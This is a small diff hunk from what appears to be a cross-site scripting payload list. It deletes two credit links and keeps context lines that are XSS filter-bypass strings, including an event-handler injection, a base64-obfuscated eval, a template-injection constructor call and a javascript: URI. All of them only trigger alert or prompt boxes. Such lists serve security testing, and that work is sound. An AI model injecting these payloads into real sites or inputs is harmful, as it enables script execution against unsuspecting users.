@@ -11,5 +11,4 @@ asd"`> onpointerenter=x=prompt,x`XSS`
 \"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
 {{constructor.constructor(alert`1`)()}}
 javascript:new%20Function`al\ert\`1\``;
-https://twitter.com/xhzeem/status/1378316651431612422
-https://twitter.com/xhzeem/status/1377992310974218245
+
